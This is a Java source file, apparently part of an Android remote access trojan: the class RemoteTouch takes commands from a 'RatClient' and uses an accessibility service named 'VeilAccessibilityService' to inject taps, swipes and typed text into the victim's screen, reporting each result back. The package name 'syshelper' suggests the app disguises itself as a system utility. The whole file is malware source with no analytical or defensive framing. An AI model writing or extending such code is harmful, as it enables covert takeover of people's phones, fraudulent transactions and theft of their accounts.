package com.syshelper.service;
import android.view.accessibility.AccessibilityNodeInfo;

public class RemoteTouch {
    private final RatClient client;

    public RemoteTouch(RatClient client) { this.client = client; }

    public void tap(float x, float y) {
        VeilAccessibilityService acc = VeilAccessibilityService.getInstance();
        if (acc != null) {
            boolean success = acc.injectTap(x, y);
            client.sendResult("touch", success ? "tap ok" : "tap failed");
        } else { client.sendResult("touch", "accessibility service not running"); }
    }

    public void swipe(float x1, float y1, float x2, float y2, long duration) {
        VeilAccessibilityService acc = VeilAccessibilityService.getInstance();
        if (acc != null) {
            boolean success = acc.injectSwipe(x1, y1, x2, y2, duration);
            client.sendResult("touch", success ? "swipe ok" : "swipe failed");
        } else { client.sendResult("touch", "accessibility service not running"); }
    }

    public void typeText(String text) {
        VeilAccessibilityService acc = VeilAccessibilityService.getInstance();
        if (acc != null) {
            AccessibilityNodeInfo focused = acc.getRootInActiveWindow();
            if (focused != null) {
                acc.injectText(focused, text);
                client.sendResult("touch", "text injected");
            } else { client.sendResult("touch", "no focused element"); }
        } else { client.sendResult("touch", "accessibility service not running"); }
    }
}
